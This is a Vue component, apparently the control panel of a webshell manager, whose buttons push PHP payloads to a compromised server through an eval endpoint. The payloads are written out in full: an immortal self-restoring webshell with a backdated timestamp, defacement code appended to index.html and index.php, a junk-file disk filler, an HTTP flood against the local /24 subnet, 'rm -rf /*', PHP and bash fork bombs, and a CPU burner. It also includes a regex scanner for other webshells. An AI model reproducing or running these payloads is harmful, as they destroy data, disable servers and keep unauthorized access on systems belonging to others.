<script setup>
import { store } from '@/assets/store';
import { addPopup, postDataOrPopupError } from '@/assets/utils';
import { Base64 } from 'js-base64';
import { computed, ref } from 'vue';


const props = defineProps({
  session: String,
})

if (props.session) {
  store.session = props.session
} else {
  alert("未知错误：没有选中session")
}
const actionInput = ref("");
const actionResult = ref("")

async function postCode(code) {
  let result
  actionResult.value = ""
  try {
    result = await postDataOrPopupError(`/session/${props.session}/php_eval`, {
      code: code.replace("{action_input_base64}", Base64.encode(actionInput.value))
    })
  } catch (e) {
    addPopup("yellow", "有些脚本会一直进行", "所以会造成超时错误，不用担心")
    throw e
  }

  actionResult.value = result
  actionInput.value = ""
}

async function writeBlackPage(code, html) {
  if (actionInput.value == "") {
    actionResult.value = "输入你要挂的消息（Hacked by xxx之类的）"
  } else {
    actionInput.value = ""
    await postCode(code.replace("HTML_B64", Base64.encode(html)));
  }
}

const blackPageHtml = computed(() => {
  const codeOrig = atob("ID8+CjxzY3JpcHQ+CiAgZnVuY3Rpb24gYWRkTm9pc3lUZXh0KCkgewogICAgZnVuY3Rpb24gc2V0UG9zKHRyYW5zaXRpb24pIHsKICAgICAgcC5zdHlsZSA9IGAKICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICB6LWluZGV4OiAxMTQ1MTQ7CiAgICAgIGZvbnQtc2l6ZTogNjBweDsKICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZTsKICAgICAgZm9udC13ZWlnaHQ6IGJvbGRlcjsKICAgICAgdG9wOiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICh3aW5kb3cuaW5uZXJIZWlnaHQgLSAyMDApICsgd2luZG93LnBhZ2VZT2Zmc2V0KX1weDsKICAgICAgbGVmdDogJHtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAod2luZG93LmlubmVyV2lkdGggKiAwLjYpICsgd2luZG93LnBhZ2VYT2Zmc2V0KX1weDsKICAgICAgdHJhbnNpdGlvbjogYWxsICR7dHJhbnNpdGlvbiB8fCAiMnMifTsKICAgICAgYW5pbWF0aW9uOiBnbG93aW5nIDJzIGluZmluaXRlOwogICAgYAogICAgfQoKICAgIGZ1bmN0aW9uIHJlY1NldFBvcygpIHsKICAgICAgc2V0UG9zKCkKICAgICAgc2V0VGltZW91dChyZWNTZXRQb3MsIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDEwMDAgKyAyMDAwKSkKICAgIH0KCiAgICBsZXQgcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInAiKQogICAgbGV0IHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKQogICAgc3R5bGUudGV4dENvbnRlbnQgPSBgCiAgICBAa2V5ZnJhbWVzIGdsb3dpbmcgewogICAgICAwJSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigyNTUsIDAsIDApO30KICAgICAgMzMlIHt0ZXh0LXNoYWRvdzogM3B4IDNweCAycHggcmdiKDAsIDI1NSwgMCk7fQogICAgICA2NiUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMCwgMCwgMjU1KTt9CiAgICAgIDEwMCUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMjU1LCAwLCAwKTt9CiAgICB9CiAgICBgCiAgICBwLnRleHRDb250ZW50ID0gIkhBQ0tFRF9CWV9NRSIKICAgIHAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24gKCkgewogICAgICBzZXRQb3MoIjBzIikKICAgIH0pCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHApCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHN0eWxlKQogICAgcmVjU2V0UG9zKCkKICB9CiAgZm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7CiAgICBzZXRUaW1lb3V0KGFkZE5vaXN5VGV4dCwgaSAqIDUwMCkKICB9Cgo8L3NjcmlwdD4KPD9waHAg")
  return codeOrig.replace("HACKED_BY_ME", actionInput.value)
})


const helloWorldCode = `
$name = base64_decode('{action_input_base64}');
if($name == "") {
  echo "你好，现在的时间戳是" . time();;
}else{
  echo "你好，$name";
}
`

// 这里可能是在eval中执行，__FILE__的值不代表文件路径
const persistWebshell = `
ignore_user_abort(true);
set_time_limit(0);
@session_write_close();
$filepath = base64_decode('{action_input_base64}');

function deleteFolder($folder) {
  $files = glob($folder . '/*');
  foreach ($files as $file) {
    if (is_file($file)) {
      unlink($file);
    } elseif (is_dir($file)) {
      deleteFolder($file);
    }
  }
  rmdir($folder);
}

function main($filepath) {
  $code = file_get_contents($filepath);
  while (1) {
    if (is_dir($filepath)) {
      deleteFolder($filepath);
    }
    file_put_contents($filepath, $code);
    if(function_exists('touch')) {
      touch($filepath, strtotime('2023-10-01 12:00:00'));
    }else{
      system('touch -m -d "2023-10-01 12:00:00" ' . $filepath);
      system('chattr +i ' . $filepath . '2>/dev/null');
    }
    usleep(1000);
  }
}
if($filepath == "") {
  $filepath = $_SERVER['SCRIPT_FILENAME'];
}

if(!is_writable(dirname($filepath))) {
  echo "文件夹".dirname($filepath)."不可写！";
}else if(!is_writable($filepath)) {
  echo "文件".$filepath."不可写！";
}else{
  main($filepath);
}
`

const findWebshells = `
function scanFiles($folder, $file_regexp)
{
    $result = [];
    $files = glob($folder . '/*');
    foreach ($files as $file) {
        if (is_file($file) && preg_match($file_regexp, $file)) {
            array_push($result, $file);
        } elseif (is_dir($file)) {
            $result = array_merge($result, scanFiles($file,  $file_regexp));
        }
    }
    return $result;
}

$var_regexp = '@?\\$(\\[\\s*|\\s*\\]|\\{\\s*|\\s*\\}|\\$|@|[A-Za-z0-9._])+';
$comment_regexp = '(\\s|\\/\\*.*?\\*\\/)*';
$string_regexp = "('[^']+'" . '|"[^"]+")';

$regexp = "/(eval|system|array_map|exec|shell_exec|wofeiwo|system|shell|" .
    "webshell|assert|create_function|preg_replace|popen|pcntl_exec|ngel|" .
    "reDuh|passthru|php_nst|phpspy|proc_open|call_user_func(_array)?|unserialize|" .
    "ReflectionClass|ReflectionFunction|newInstanceArgs)\\\\(" .
    "|{$comment_regexp}{$var_regexp}{$comment_regexp}\\({$comment_regexp}.*{$comment_regexp}\\)" . # $aaa(xxx);
    "|{$string_regexp}\\^{$string_regexp}" . # string xor
    "|\\\\(({$string_regexp}\\\\.?)*{$string_regexp}\\\\)\\\\({$comment_regexp}.*{$comment_regexp}\\\\)" . # ("sys"."tem")(xxx)
    "/";
$found = false;
$filepath = base64_decode('{action_input_base64}');
if($filepath == "") {
  $filepath = $_SERVER['DOCUMENT_ROOT'];
}
if(!is_dir($filepath)) {
  echo $filepath . "不是一个文件夹！";
}

foreach (scanFiles($filepath, "/php|php\\d|phtm|phtml|phar/") as $filepath) {
  if (preg_match_all($regexp, file_get_contents($filepath), $matches)) {
    $found = true;
    $detected = "";
    foreach ($matches[0] as $match) {
      $detected = "    " . trim($match);
    }
    $display_filepath = json_encode($filepath);
    if(preg_match("/^[-_a-zA-Z0-9\\.\\/]+$/", $filepath)) {
      $display_filepath = $filepath;
    }
    echo $display_filepath . "\\n" . $detected . "\\n";
  }
}
if(!$found) {
  echo "没有找到webshell";
}
`

const writeTrashCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
while(1) {
  $fp = tmpfile();
  if ($fp) {
    fwrite($fp, uniqid());
    fclose($fp);
  }
}
`

const ddosCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$myip = base64_decode('{action_input_base64}');
$content = "GET / HTTP/1.1\\r
Host: IP\\r
\\r";
if(!$myip) {
  echo ("给一个C段中本机的IP，这个IP不会被DDoS");
}else{
  while(1) {
    for($i = 0; $i < 256; $i ++) {
      $targetip = long2ip((ip2long($myip) & 0xffffff00) + $i);
      if($targetip == $myip) {
        continue;
      }
      for($j = 0; $j < 1000; $j ++) {
        $socket = fsockopen($targetip, 80, $error_code, $error_message);
        if(!$socket) {
          break;
        }
        fwrite($socket, str_replace($targetip, "IP", $content));
        fclose($socket);
      }
    }
  }
}
`

const blackPageCode = `
$code = base64_decode('HTML_B64');
if(file_exists('index.html')) {
  if(file_put_contents('index.html', $code, FILE_APPEND)){
    echo "写入到index.html...";
  }else{
    echo "写入到index.html失败";
  }
}
if(file_exists('index.php')) {
  if(file_put_contents('index.php', $code, FILE_APPEND)){
    echo "写入到index.php...";
  }else{
    echo "写入到index.php失败";
  }
}
`

const phpForkBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
if(!function_exists('pcntl_fork')) {
  echo "没有pcntl_fork函数！";
}else{
  while (1) {
    pcntl_fork();
  }
}
`

const bashForkBombCode = `
$code = 'x(){ x|x & };x';
system($code);
`

const rmRfCode = `
passthru('rm -rf /*', $ret);
echo "运行完成，返回码为$ret";
`

const phpCpuBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$content = file_get_contents("/proc/cpuinfo");
while (1) {
  $a = md5($content);
}
`

</script>

<template>
  <div class="actionmain">
    <div class="action-group">
      <p class="group-title shadow-box">
        权限维持
      </p>
      <div class="actions shadow-box">
        <button class="action" title="检查对面服务器是否健在" @click="postCode(helloWorldCode)">
          一键你好（测试用）
        </button>
        <button class="action" title="将当前webshell转为不死马，顺带改一下文件的时间戳，如果需要维持其他文件请输入文件路径"
          @click="postCode(persistWebshell)">
          不死维持当前webshell
        </button>
        <button class="action" title="使用正则表达式找出当前服务器的所有webshell，可以手动指定扫描文件夹"
          @click="postCode(findWebshells)">
          webshell文件查杀
        </button>
      </div>
    </div>
    <div class="action-group">
      <p class="group-title shadow-box">
        一键搅史
      </p>
      <div class="actions shadow-box">
        <button class="action" title="在index.html和index.php后面加一点料。。。"
          @click="writeBlackPage(blackPageCode, blackPageHtml)">
          一键挂黑页
        </button>
        <button class="action" title="不断创建临时垃圾文件" @click="postCode(writeTrashCode)">
          一键写垃圾文件
        </button>
        <button class="action" title="一键DDoS当前C段" @click="postCode(ddosCode)">
          一键DDoS内网
        </button>
        <button class="action" title="运行rm -rf /*" @click="postCode(rmRfCode)">
          一键rm -rf
        </button>
        <button class="action" title="调用pcntl_fork实现fork bomb" @click="postCode(phpForkBombCode)">
          一键Fork Bomb (PHP版)
        </button>
        <button class="action" title="使用system函数调用Linux Shell实现fork bomb" @click="postCode(bashForkBombCode)">
          一键Fork Bomb (Linux Shell版)
        </button>
        <button class="action" title="不断运行md5(xxx)，建议点个几十下" @click="postCode(phpCpuBombCode)">
          一键占满CPU（多点几下有惊喜）
        </button>
      </div>
    </div>
    <div class="action-input">
      <input type="text" class="shadow-box" v-model="actionInput" placeholder="如果action需要额外的信息在这里输入">
    </div>
    <textarea class="action-result shadow-box" v-model="actionResult" readonly>

  </textarea>

  </div>

</template>

<style scoped>
.actionmain {
  display: flex;
  flex-direction: column;
  align-items: center;
  height: 90%;
}

.action-group {
  display: flex;
  flex-direction: column;
  margin-bottom: 30px;
  width: 80%;
  margin-left: 20%;
  margin-right: 20%;
}

.group-title {
  background-color: var(--background-color-2);
  color: var(--font-color-primary);
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  margin: 0;
  padding-top: 20px;
  padding-bottom: 20px;
  border-radius: 20px;
  margin-bottom: 10px;
}

.actions {
  background-color: var(--background-color-2);
  width: 100%;
  border-radius: 20px;
  margin-top: 20px;
  flex-grow: 1;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
  grid-gap: 20px;
  padding: 20px;
}

.action {
  background-color: var(--background-color-3);
  color: var(--font-color-primary);
  padding: 20px;
  min-height: 100px;
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 20px;
}

.action:hover {
  opacity: 0.9;
}

.action-input {
  width: 80%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.action-input input {
  width: 100%;
  height: 50px;
  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 24px;
  color: var(--font-color-primary);
  padding-left: 15px;
  padding-right: 15px;
  margin-bottom: 30px;

}


.action-result {
  width: 80%;
  height: 100%;
  box-sizing: border-box;
  resize: none;

  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;

  font-size: 20px;
  color: var(--font-color-primary);
  padding: 10px;
}
</style>
